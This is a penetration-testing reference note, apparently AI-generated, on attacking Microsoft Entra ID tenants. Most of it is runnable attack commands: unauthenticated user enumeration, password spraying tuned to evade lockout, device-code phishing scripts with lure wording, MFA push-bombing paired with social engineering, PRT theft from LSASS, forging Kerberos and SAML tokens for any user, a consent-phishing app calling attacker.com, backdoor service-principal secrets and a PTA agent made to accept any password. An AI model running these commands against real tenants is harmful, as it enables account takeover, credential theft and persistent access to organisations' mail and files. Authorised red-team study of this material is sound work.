# Entra ID (Azure Active Directory)

#EntraID #AzureAD #ActiveDirectory #CloudIdentity

## What is Entra ID?

Microsoft Entra ID (formerly Azure AD) is Microsoft's cloud identity platform — the IdP for Microsoft 365, Azure, and thousands of SaaS apps. Attack surface: password spraying, MFA bypass, Conditional Access bypass, OAuth token theft, illicit consent grants, PRT (Primary Refresh Token) abuse, Service Principal credential abuse, Seamless SSO NTLM hash extraction, and guest/external user misconfigurations.

- Tenants identifiable via: `https://login.microsoftonline.com/<tenant>.onmicrosoft.com`
- Auth type per domain is either **Managed** (password hash sync, native Azure AD auth) or **Federated** (ADFS/third-party IdP) — this changes which bypass techniques apply (Golden SAML only matters for Federated tenants).

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Cloud/AADInternals\|AADInternals]] | PowerShell swiss-army-knife — recon, spray, PRT/token abuse, ADFS/Golden SAML, PTA backdooring, Azure AD Connect creds |
| [[Tools/Cloud/ROADtools\|ROADtools]] | `roadrecon` (bulk tenant enumeration → SQLite/web UI) + `roadtx` (token manipulation, PRT/FOCI abuse) |
| [[Tools/Cloud/GraphRunner\|GraphRunner]] | Post-auth Graph API pillaging (Teams, SharePoint, OneDrive, Outlook) + OAuth app backdooring |
| [[Tools/Cloud/BARK\|BARK]] | BloodHound Attack Research Kit — executes specific abuse primitives (add group member, grant role, add SP secret) that map 1:1 to BloodHound Azure edges |
| [[Tools/Cloud/AzureHound\|AzureHound]] | BloodHound data collector for Entra ID + Azure RBAC |
| [[Tools/Cloud/TokenTactics\|TokenTactics / TokenTacticsV2]] | PowerShell refresh/access token abuse and resource-to-resource token swapping |
| [[Tools/Cloud/MSOLSpray\|MSOLSpray]] | Password spray via the legacy MSOL endpoint |
| [[Tools/Cloud/Go365\|Go365]] | Fast password spray via the Graph API token endpoint, detects lockout |
| [[Tools/Cloud/CredMaster\|CredMaster]] | Multi-protocol spray with Fireprox IP rotation |
| [[Tools/Auth/Hydra\|Hydra]] | Generic protocol brute force — IMAP/legacy-auth spraying |
| [[Tools/Lateral Movement/responder\|Responder]] | Capture NTLM hash via Seamless SSO `autologon` endpoint coercion |
| [[Tools/Credential Dumping/mimikatz\|mimikatz]] | Extract PRT + session key from LSASS (`sekurlsa::cloudap`), on-prem DCSync |
| [[Tools/Credential Dumping/secretsdump\|secretsdump.py]] | DCSync using stolen MSOL / Azure AD Connect credentials |
| [[Tools/Cloud/Evilginx2\|Evilginx2]] | AiTM phishing proxy — captures session cookies/tokens, defeats MFA |
| Azure CLI (`az`) | Authenticate as a service principal, enumerate/abuse RBAC role assignments |

---

## Enumeration

```bash
# Tenant ID from domain
curl -s "https://login.microsoftonline.com/<domain.com>/.well-known/openid-configuration" | jq '{tenant_id:.token_endpoint}' | grep -oP '[0-9a-f-]{36}'

# Check if domain is federated (ADFS) or managed (password hash sync)
curl -s "https://login.microsoftonline.com/common/userrealm/?user=test@<domain.com>&api-version=1.0" | \
  jq '{NameSpaceType:.NameSpaceType, FederationBrandName:.FederationBrandName, AuthURL:.AuthURL}'
# NameSpaceType: "Managed" = Azure AD native auth | "Federated" = ADFS/third-party IdP

# AADInternals — full unauthenticated tenant recon
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName <domain.com>
# Returns: tenant name/ID, auth type, MDI (Defender for Identity), MFA methods, Seamless SSO status

# Get all domains in a tenant (via Autodiscover)
curl -s "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc" \
  -H "Content-Type: text/xml" \
  -d '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>test@<domain.com></EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>'

# User enumeration without auth (GetCredentialType — error differentiation)
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@<domain.com>","isOtherIdpSupported":true}' | \
  jq '{exists:.IfExistsResult, throttle:.ThrottleStatus}'
# IfExistsResult: 0 = user exists, 1 = doesn't exist, 5/6 = different tenant

# Bulk user enumeration
while read user; do
  result=$(curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user@<domain.com>\"}" | python3 -c "import sys,json; print(json.load(sys.stdin)['IfExistsResult'])")
  [ "$result" = "0" ] && echo "[EXISTS] $user@<domain.com>"
done < usernames.txt
```

### Post-Auth — Microsoft Graph API Enumeration

Once you have any valid access token, pivot to enumerating the tenant directly through Graph.

```bash
TOKEN="<access-token>"
BASE="https://graph.microsoft.com/v1.0"

# Current user / all users / groups
curl -s "$BASE/me" -H "Authorization: Bearer $TOKEN" | jq '{displayName:.displayName, userPrincipalName:.userPrincipalName, id:.id}'
curl -s "$BASE/users?\$top=999&\$select=displayName,userPrincipalName,onPremisesSamAccountName" -H "Authorization: Bearer $TOKEN"
curl -s "$BASE/groups?\$top=999" -H "Authorization: Bearer $TOKEN"

# Global Admins
curl -s "$BASE/directoryRoles" -H "Authorization: Bearer $TOKEN" | jq '.value[] | select(.displayName=="Global Administrator") | .id'
curl -s "$BASE/directoryRoles/<role-id>/members" -H "Authorization: Bearer $TOKEN" | jq '.value[].userPrincipalName'

# Mail / files / Teams (scope-dependent: Mail.Read, Files.Read, ChannelMessage.Read.All)
curl -s "$BASE/me/messages?\$top=50" -H "Authorization: Bearer $TOKEN"
curl -s "$BASE/me/drive/root/children" -H "Authorization: Bearer $TOKEN"
curl -s "$BASE/teams" -H "Authorization: Bearer $TOKEN"

# Sensitive-file search
curl -s "$BASE/search/query" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"requests":[{"entityTypes":["driveItem"],"query":{"queryString":"password OR secret OR credentials"},"from":0,"size":25}]}'
```

For deep pillaging (Teams/SharePoint/OneDrive/Outlook keyword search across the tenant), use [[Tools/Cloud/GraphRunner|GraphRunner]] rather than hand-rolled Graph calls.

---

## Attack Vectors

### Password Spraying

```bash
# AADInternals spray (respects lockout — 1 attempt per account)
Import-Module AADInternals
Invoke-AADIntPasswordSprayEWS -UserList users.txt -Password "Spring2024!" -Verbose

# MSOLSpray
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!"

# Go365 — spray via Graph API endpoint (faster, detects lockout)
go365 -ul users.txt -p "Spring2024!" -d <domain.com> -o results.txt

# CredMaster — spray across multiple protocols + IP rotation via Fireprox
python3 credmaster.py --userfile users.txt --passwordfile passwords.txt --plugin o365 --threads 1 --delay 30

# Check throttle/lockout status before spraying
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" -d '{"username":"target@<domain.com>"}' | jq '.ThrottleStatus'
```

> [!warning]
> Smart Lockout: ~10 failed attempts trigger a 60-second lockout window, per account. Spray one password per round, wait 60+ minutes between rounds. The legacy EWS endpoint can carry a separate lockout counter from the primary sign-in endpoint.

### MFA Bypass

```bash
# --- Legacy Protocol Spray (if Basic Auth still enabled) ---
# Legacy protocols (EWS, IMAP, POP3, SMTP, ActiveSync) bypass MFA if CA doesn't explicitly block them
curl -sk --url imaps://outlook.office365.com:993 -u "user@<domain.com>:Password1" --request 'LOGIN "user@<domain.com>" "Password1"'
hydra -L users.txt -p "Password1" -s 993 -S imap.gmail.com imap
curl -s "https://login.microsoftonline.com/<domain.com>/.well-known/openid-configuration" | jq '.token_endpoint_auth_methods_supported'

# --- MFA Fatigue / Push Bombing ---
# Repeatedly authenticate with correct creds -> floods user with Authenticator push prompts
# Pair with social engineering: "IT here, approve the push to complete your MFA reset"

# --- Device Code Phishing ---
python3 -c "
import requests
r = requests.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
  data={'client_id':'1b730954-1685-4b74-9bfd-dac224a7b894',
        'scope':'openid profile email offline_access https://graph.microsoft.com/.default'})
print(r.json())
"
# Phish: "Your MFA device needs re-registration. Go to microsoft.com/devicelogin and enter: ABCD-EFGH"
python3 -c "
import requests, time
device_code = '<device_code_from_above>'
while True:
    r = requests.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
      data={'grant_type':'urn:ietf:params:oauth2:grant-type:device_code',
            'client_id':'1b730954-1685-4b74-9bfd-dac224a7b894', 'device_code':device_code})
    if 'access_token' in r.text: print(r.json()); break
    time.sleep(5)
"

# --- Adversary-in-the-Middle (AiTM) Phishing ---
# Evilginx2 / Modlishka proxy between user and Microsoft — captures the session cookie/token itself, which bypasses MFA outright
# See Evilginx2's microsoft365 phishlet

# --- Conditional Access Policy Gap ---
# CA policies may not apply to all clients/platforms — test with different user agents
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -H "User-Agent: BAV2ROPC" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&scope=openid&username=user@<domain>&password=Password1"
```

### Token Theft & Abuse

```bash
# Access token via refresh token
curl -s -X POST "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&refresh_token=<refresh-token>&scope=https://graph.microsoft.com/.default"

# Decode a JWT access token
echo "<access-token>" | python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
payload = token.split('.')[1]
payload += '=' * (4 - len(payload) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))
"
# Look for: scp (scopes), roles, oid (user object ID), tid (tenant ID), upn (username)

# Use access token with Graph API
curl -s "https://graph.microsoft.com/v1.0/me" -H "Authorization: Bearer $TOKEN"

# Same refresh token -> tokens for other resources (Exchange, SharePoint, ARM)
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&refresh_token=<rt>&scope=https://outlook.office.com/.default"
```

### FOCI (Family of Client IDs) Abuse

Microsoft first-party apps (Azure CLI, Azure PowerShell, Microsoft Office, Teams, etc.) share membership in the **Family of Client IDs** — a refresh token issued to one FOCI member can be redeemed for an access token under a *different* FOCI client ID, without re-authenticating or re-triggering Conditional Access checks tied to the original client. A refresh token phished or stolen for one "boring" client (e.g. Azure PowerShell) can be silently reused against a completely different client (e.g. Azure CLI or a first-party app with broader pre-consented Graph permissions).

**Conditions:** any valid FOCI-member refresh token; no special privilege required.

```bash
# Same refresh token, different FOCI client ID — Azure CLI's client_id instead of the one it was issued under
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&refresh_token=<rt>&scope=https://graph.microsoft.com/.default"

# roadtx makes swapping client IDs on a stolen refresh token straightforward
roadtx gettokens --refresh-token <rt> --client 04b07795-8ddb-461a-bbee-02f9e1bf7b46 --scope https://graph.microsoft.com/.default
```

> [!note]
> This is why the `client_id` values reused throughout this note (Azure PowerShell, Azure CLI, Microsoft Office, Microsoft Azure PowerShell) matter — they're all FOCI members. Full list changes over time; verify current FOCI membership before relying on a specific client_id.

### PRT (Primary Refresh Token) Abuse

PRTs are long-lived tokens issued to Azure AD-joined or Hybrid-joined Windows devices. Stealing a PRT = impersonate the user without MFA (device compliance is already satisfied).

```bash
# PRT lives in LSASS memory on Azure AD-joined Windows devices
privilege::debug
sekurlsa::cloudap         # dumps PRT + ProofOfPossession key

# AADInternals — use stolen PRT to get tokens
Import-Module AADInternals
$prt = "<base64-prt>"
$sessionKey = "<hex-session-key>"
$nonce = Get-AADIntUserPRTNonce -PRTToken $prt
$token = Get-AADIntAccessTokenForMSGraph -PRTToken $prt -SessionKey $sessionKey -Nonce $nonce

# roadtx — extract/convert a stolen PRT
roadtx gettokens --prt <prt-cookie> --prt-sessionkey <hex-key>

# Browser-based PRT abuse — forge an SSO cookie from PRT
$cookie = New-AADIntUserPRTToken -RefreshToken $prt -SessionKey $sessionKey
# Set cookie x-ms-RefreshTokenCredential in browser -> navigate to portal.azure.com

# Check if machine is Azure AD joined
dsregcmd /status
# Look for: AzureAdJoined: YES, WorkplaceJoined, SSO State
```

### Seamless SSO — NTLM Hash Extraction

Seamless SSO creates a computer account `AZUREADSSOACC$` in on-prem AD. Its Kerberos key can be used to forge Kerberos service tickets for Azure AD authentication.

```bash
# Check if Seamless SSO is enabled
curl -s "https://autologon.microsoftazuread-sso.com/<domain.com>/winauth/trust/2005/usernamemixed?client-request-id=$(python3 -c 'import uuid; print(uuid.uuid4())')"
# 401 = enabled, 404 = not enabled

# From inside the network — the autologon endpoint triggers NTLM auth; capture with Responder
responder -I eth0 -rdw
# Or DNS-poison autologon.microsoftazuread-sso.com to point at Responder

# With on-prem AD access — extract AZUREADSSOACC$'s Kerberos key (requires DA or read rights on the account)
lsadump::dcsync /user:AZUREADSSOACC$

# Forge a Kerberos ticket for ANY user in Azure AD (including Global Admins)
New-AADIntKerberosTicket -DomainName <domain.com> -UserPrincipalName "globaladmin@<domain.com>" -UserSid <SID> -NTLM <AZUREADSSOACC-hash>
```

### Golden SAML (Federated / ADFS Tenants Only)

Only applies when the domain's `NameSpaceType` is **Federated** (ADFS or third-party IdP). Compromising ADFS's token-signing certificate private key lets you forge SAML tokens for *any* federated user — including Global Admins — completely offline, with no interaction with Azure AD's own authentication stack (so no MFA, no Conditional Access, no sign-in log for the actual token issuance). See [[Services/Active Directory/ADFS|ADFS]] for the full on-prem enumeration and key-extraction methodology — this section only covers the cloud-side consumption of the forged token.

**Conditions:** local admin (or equivalent) on the ADFS server, or access to its encrypted config/certificate backup.

```powershell
# AADInternals — export the ADFS token-signing certificate (needs config data + encryption key)
Import-Module AADInternals
Export-AADIntADFSEncryptionKey                       # remote-capable against the ADFS server
# Combine with the AD FS configuration database to decrypt the token-signing cert's private key
# See https://aadinternals.com/post/adfs/ for the current end-to-end extraction chain — Microsoft has
# tightened this over time, verify the exported-cert workflow still matches the target ADFS version.

# Forge a SAML token for any federated user with the recovered certificate
New-AADIntSAMLToken -Certificate <path-to-cert.pfx> -Issuer "http://<adfs-server>/adfs/services/trust" -UserPrincipalName "globaladmin@<domain.com>"
```

> [!note]
> This is the federated-tenant analogue of the Seamless SSO NTLM extraction above — same end goal (forge a token for any user, offline), different trust mechanism (SAML signing cert vs. Kerberos key).

### Conditional Access Bypass

```bash
# Check current CA policies applied to your token
curl -s "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.value[] | {displayName:.displayName, state:.state}'

# --- Named Location gaps --- CA often excludes specific IP ranges (office IPs, VPN)
curl -s "https://ipinfo.io/json"

# --- Compliant device spoofing --- use a device token from a real managed device, or a PRT from an already-compliant AADJ device

# --- Legacy protocol (if not blocked) --- some CA policies don't apply to legacy auth clients
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/token" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&resource=https://graph.microsoft.com&username=user@<domain>&password=Password1"

# --- App exclusions --- some apps (breakglass accounts, legacy apps) are excluded from CA; test different client_id values
CLIENT_IDS=(
  "1b730954-1685-4b74-9bfd-dac224a7b894"   # Azure PowerShell
  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"   # Azure CLI
  "1950a258-227b-4e31-a9cf-717495945fc2"   # Microsoft Azure PowerShell
  "d3590ed6-52b3-4102-aeff-aad2292ab01c"   # Microsoft Office
)

# --- Guest account misconfiguration --- external/guest users may have a different CA policy set applied
# Invite your attacker account as guest -> different policy set may apply
```

### Nested App Authentication CA Bypass (patched — know it for methodology, verify before relying on it)

Disclosed by NetSPI in 2025: Nested App Authentication (NAA) lets a "host" app (e.g. the Azure Portal) broker tokens to a "nested" app on the user's behalf via `brk_client_id`/`brk_redirect_uri` parameters. Against the `ADIbizaUX` client — a heavily-privileged first-party component of the Azure Portal — brokered token requests did not evaluate Conditional Access at all, so a captured Azure Portal refresh token (e.g. via AiTM proxy) could mint a Graph token that skipped CA entirely. Microsoft has since patched this specific bypass.

**Why it's still worth knowing:** it's a live example of the broader NAA/broker trust-chain risk — any future first-party broker client with similarly broad pre-consented Graph permissions is a candidate for the same class of gap. Check for current NAA-related advisories before assuming any specific bypass still works.

### Illicit Consent Grant / OAuth App Backdooring

Register (or host) an app requesting broad, high-value delegated or application permissions (`Mail.Read`, `Files.ReadWrite.All`, `offline_access`, `Directory.Read.All`), then get a user — ideally an admin, via consent-phishing or a legitimate-looking internal tool — to click "Accept" on the OAuth consent screen. No password or MFA involved; consent alone grants the app standing access, and `offline_access` gets you a refresh token that survives password resets.

**Conditions:** ability to register an app (any authenticated user, by default tenant settings) or compromise of an existing app; a user willing to click consent (or admin consent already granted tenant-wide for that permission set).

```powershell
# GraphRunner — generate a malicious OAuth app + consent-phishing URL
Import-Module .\GraphRunner.ps1
Invoke-InjectOAuthApp -Tokens $tokens -AppName "IT Support" `
  -ReplyUrl "https://attacker.com/callback" `
  -Scope "Mail.Read,Files.ReadWrite.All,offline_access"
# Returns a consent URL — send to target; on Accept, GraphRunner captures the resulting tokens

# Manual equivalent — direct the target to the v2 admin-consent endpoint with your app's client_id
# https://login.microsoftonline.com/<tenant>/adminconsent?client_id=<your-app-id>&redirect_uri=<your-redirect>
```

> [!warning]
> If the tenant allows **user consent for low/medium-risk apps** (a common default), this doesn't even need an admin — any user can grant an attacker-controlled app access to their own mailbox/files, which is often enough for BEC or further pivoting.

### Service Principal & App Registration Abuse

```bash
# List service principals / app registrations with secrets
curl -s "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=999" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | {displayName:.displayName, appId:.appId, id:.id}'
curl -s "https://graph.microsoft.com/v1.0/applications?\$top=999" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | {displayName:.displayName, appId:.appId, passwordCredentials:.passwordCredentials}'

# Find over-privileged service principals (Global Admin, etc.)
curl -s "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal&\$filter=roleDefinitionId eq '<global-admin-role-id>'" \
  -H "Authorization: Bearer $TOKEN"

# Add credentials to a service principal / app (if you have Application.ReadWrite.All, or own the app)
curl -s -X POST "https://graph.microsoft.com/v1.0/applications/<object-id>/addPassword" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"passwordCredential":{"displayName":"backdoor"}}'
# Returns: clientSecret — use with tenant ID to auth as this app

# Authenticate as service principal with client secret
curl -s -X POST "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=<app-id>&client_secret=<secret>&scope=https://graph.microsoft.com/.default"

# Find managed identities/SPs with over-permissive Azure RBAC roles
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>
az role assignment list --all --assignee <app-id> -o table
```

Use [[Tools/Cloud/BARK|BARK]] once BloodHound has identified a specific abuse path — its functions (`Invoke-AZAddSecretToApp`, `Invoke-AZGrantAppRoles`, `Invoke-AZAddOwnerToApp`) map 1:1 to these primitives instead of hand-rolling Graph calls.

### Dynamic Group / Role Abuse for Persistence

If a Dynamic Group's membership rule can be influenced (e.g. it includes users matching an attribute you can set on an account you control, or the rule is broader than intended) and that group holds a privileged role assignment or app role grant, adding/modifying the qualifying attribute silently grants membership — and the privilege that comes with it — without ever touching the role assignment directly. This is a favored persistence technique because role-assignment audit reviews often don't re-evaluate dynamic membership rules.

```bash
# Enumerate dynamic groups and their membership rules
curl -s "https://graph.microsoft.com/v1.0/groups?\$filter=groupTypes/any(c:c eq 'DynamicMembership')&\$select=displayName,membershipRule,membershipRuleProcessingState" \
  -H "Authorization: Bearer $TOKEN"

# Cross-reference which of those groups hold directory role or app role assignments
curl -s "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | select(.principal."@odata.type"=="#microsoft.graph.group")'

# If you can write the qualifying attribute on a controlled account (e.g. department, extensionAttribute)
curl -s -X PATCH "https://graph.microsoft.com/v1.0/users/<your-controlled-user-id>" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"department":"<value-matched-by-the-rule>"}'
# Membership (and inherited role) applies on the next dynamic group refresh cycle
```

### Azure AD Connect Attacks

Azure AD Connect syncs on-prem AD to Entra ID. Compromise gives full tenant control.

```bash
# MSOL service account has DCSync rights on-prem
Get-ADUser -Filter 'Name -like "MSOL_*"' | Select SamAccountName, DistinguishedName

# Extract MSOL account password from the Azure AD Connect server (local admin required)
Import-Module AADInternals
Get-AADIntSyncCredentials
# Returns: MSOL username + cleartext password, plus Azure AD service account credentials

# Use MSOL creds to DCSync from anywhere on the network
secretsdump.py 'corp.local/<MSOL_account>:<password>@<dc-ip>'

# Pass-Through Authentication (PTA) agent abuse — PTA validates passwords against on-prem AD
Install-AADIntPTASpy    # intercepts password validation calls, logs all auth attempts
Set-AADIntPTABypass -Enable   # makes the agent accept any password for any user
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Global Admin assigned to a service principal | SP credential compromise = full tenant takeover |
| Legacy authentication not blocked by Conditional Access | MFA bypass via IMAP/EWS/legacy clients |
| No MFA enforced for admin roles | Single password compromise = full access |
| SSPR enabled for admins without strong secondary verification | Phone/email takeover -> admin password reset |
| Seamless SSO enabled + `AZUREADSSOACC$` compromised | Forge Azure AD Kerberos tickets for any user |
| Federated (ADFS) trust + token-signing cert exposed | Golden SAML — forge tokens for any user, offline |
| Azure AD Connect server compromised | MSOL account = on-prem DCSync + tenant access |
| Guest access unrestricted | External users can enumerate the directory |
| User consent allowed for apps requesting broad permissions | Illicit consent grant needs no admin, no MFA |
| App registrations with long-lived secrets | Static creds -> persistent access |
| Dynamic group membership rule broader than intended | Silent privilege grant via attribute manipulation |
| Device compliance not required by Conditional Access | Token from an unmanaged device is sufficient |
| PTA agent running on a compromised host | Intercept/bypass all password auth tenant-wide |

---

## Quick Reference

| Goal | Command |
|---|---|
| Tenant recon (no auth) | `curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" \| jq '.issuer'` |
| Managed vs Federated check | `curl -s "https://login.microsoftonline.com/common/userrealm/?user=test@<domain>&api-version=1.0" \| jq '{type:.NameSpaceType}'` |
| User enumeration | `curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" -d '{"username":"user@<domain>"}'` (0 = exists) |
| Device code phishing | `curl -s -X POST ".../oauth2/v2.0/devicecode" -d "client_id=1b730954-...&scope=https://graph.microsoft.com/.default"` |
| Decode a JWT token | `echo "<token>" \| python3 -c "...base64.urlsafe_b64decode..."` |
| Swap FOCI client on a stolen refresh token | `roadtx gettokens --refresh-token <rt> --client 04b07795-8ddb-461a-bbee-02f9e1bf7b46 --scope <scope>` |
| Extract PRT from LSASS | `mimikatz # sekurlsa::cloudap` |
| Seamless SSO check | `curl -s -o /dev/null -w "%{http_code}" "https://autologon.microsoftazuread-sso.com/<domain>/winauth/trust/2005/usernamemixed"` (401 = enabled) |
| AADInternals spray | `Invoke-AADIntPasswordSprayEWS -UserList users.txt -Password "Spring2024!"` |
| Graph API — list all users | `curl -s "https://graph.microsoft.com/v1.0/users?\$top=999" -H "Authorization: Bearer $TOKEN"` |
| Consent-phishing app | `Invoke-InjectOAuthApp -Tokens $tokens -AppName "IT Support" -Scope "Mail.Read,offline_access"` |
| Extract Azure AD Connect creds | `Get-AADIntSyncCredentials` |

---

*Created: 2026-03-06*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
